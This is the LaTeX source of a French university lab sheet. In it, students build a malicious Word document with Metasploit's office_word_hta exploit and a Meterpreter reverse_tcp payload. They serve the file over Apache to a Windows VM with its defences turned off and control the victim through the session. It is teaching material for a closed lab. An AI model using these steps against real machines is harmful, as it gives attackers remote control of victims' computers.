\documentclass{article}
\usepackage[a4paper,left=1.5cm, right=1.5cm, top=1cm, bottom=2cm]{geometry}
\usepackage{tikz,tcolorbox}
\usepackage{amsmath}
\usepackage[table,xcdraw]{xcolor}
\usepackage{listings}
\usepackage{array,multirow} % For customizing tables
\usepackage{booktabs} % For better horizontal lines
\usepackage{makecell}
\setlength{\parindent}{0pt}

\lstset{
    language=SQL,                    % Set language to SQL
    basicstyle=\ttfamily\small,      % Font size and family for code
    keywordstyle=\color{blue}\bfseries, % Color for SQL keywords
    commentstyle=\color{gray},       % Color for comments
    stringstyle=\color{red},         % Color for strings
    numbers=left,                    % Show line numbers on the left
    numberstyle=\tiny\color{gray},   % Line number font and color
    stepnumber=1,                    % Line number step
    breaklines=true,                 % Wrap long lines
    frame=single,                    % Add a frame around code
    tabsize=2,                       % Set tab size
    showstringspaces=false           % Hide spaces in strings
}

\usepackage[colorlinks=true, linkcolor=blue, urlcolor=blue]{hyperref}

\newcommand{\ques}[1]{
  \section*{Question #1}
  \vspace{-0.5cm}
  \noindent\rule{\textwidth}{0.5pt}%
}

\newcommand{\tit}[1]{
\begin{center}
    \Large{\textbf{{#1}}}
\end{center}
}

\definecolor{commentgray}{HTML}{676160}
\definecolor{messagegreen}{HTML}{17B867}
\definecolor{myblue}{HTML}{10C2C4}

\tcbuselibrary{skins, breakable, theorems}


\newtcolorbox{prettyBox}[2]{
  enhanced,
  colback=white!90!#2,   % Background color based on the second parameter (color)
  colframe=#2!60!black,  % Frame color based on the second parameter (color)
  coltitle=white,        % Title color (white)
  fonttitle=\bfseries\Large,
  title=#1,              % Title from the first parameter
  boxrule=1mm,
  arc=0.5mm,
  drop shadow=#2!35!gray, % Drop shadow color based on the second parameter (color)
}



\begin{document}
\tit{TP N\(^{\boldsymbol{\circ}}\)\hspace{0.1cm}2}

\vspace{0.5cm}

\begin{enumerate}
    \item Lancer les deux machines virtuelles kali linux et windows , et assure la connectiviter avec la commande \texttt{ping} .
\item Desactiver windows defender et le par-feu de la machine virtuelle windows , pourquoi les desactiver ? 
\item Installer office 2013 sur la machine virtuelle via le lien : \href{https://www.malavida.com/en/soft/microsoft-office-2013/download}{https://www.malavida.com/en/soft/microsoft-office-2013/download} , et on aura 
besoin de 7-zip pour unzip le fichier : \href{https://www.7-zip.org/}{https://www.7-zip.org/} , apres telechargement on mount le fichier.
 
\item On va utilier metasploit dans kali linux taper les commandes suivant :
\begin{itemize}
    \item \texttt{msfconsole} pour lancer l'interface de commande principale de Metasploit.
    \item \texttt{use exploit/windows/fileformat/office\_word\_hta} pour sélectionner l'exploit qui permet d'intégrer un exécutable malveillant dans un fichier word.
    \item \texttt{set payload windows/meterpreter/reverse\_tcp} : définit le payload utilisé pour établir une connexion inverse (reverse shell) depuis la machine cible Windows vers Kali Linux via TCP , c'est quoi reverse shell?
    \item \texttt{show options} : affiche les options actuelles du payload. Vérifiez que l'option \texttt{LHOST} correspond bien à l'adresse IP de votre machine Kali. Si ce n'est pas le cas, utilisez la commande : \texttt{set LHOST <IP\_KALI>}. Assurez-vous également que \texttt{LPORT} est configuré sur 4444 , Que remarquez-vous ?
    \item \texttt{exploit} : lance l'écoute et attend que la victime ouvre le fichier malveillant pour établir la connexion Meterpreter, expliquer toute les lignes que vous avez apres l'execution de cetter commande.
\end{itemize}

\item On souhaite transférer ce fichier malveillant sur la machine de la victime. Comment procéder ? Nous allons utiliser Apache pour accomplir cela. Ouvrez un terminal en tant que root sur Kali et exécutez les commandes suivantes :
    \begin{itemize}
        \item \texttt{service apache2 start} pour démarre le serveur Apache
        \item \texttt{cp <chemin/msf.doc> /var/www/html} : que fait cette commande ? 
        \item \texttt{ls /var/www/html} : vous devriez voir le fichier \texttt{msf.doc} listé dans ce répertoire.
    \end{itemize}
    \begin{itemize}
        \item Depuis la machine Windows, ouvrez un navigateur et saisissez l'URL suivante : \texttt{IP\_KALI/msf.doc} afin de télécharger et installer le fichier \texttt{msf.doc} , ouvrir ce dernier et cliquer sur "activer la modification".
    \end{itemize}

\item Que remarquez-vous sur la machine Kali Linux ? Cliquer sur entrer et exécutez les commandes suivantes sur la machine Kali :
    \begin{itemize}
        \item \texttt{pwd} 
        \item \texttt{execute -f notepad.exe} 
        \item \texttt{ps}  
        \item \texttt{kill <PID>} : permet de tuer n'importe quel processus actif sur la machine Windows depuis Kali en spécifiant son PID (Process ID).
    \end{itemize}
\end{enumerate}
\end{document}
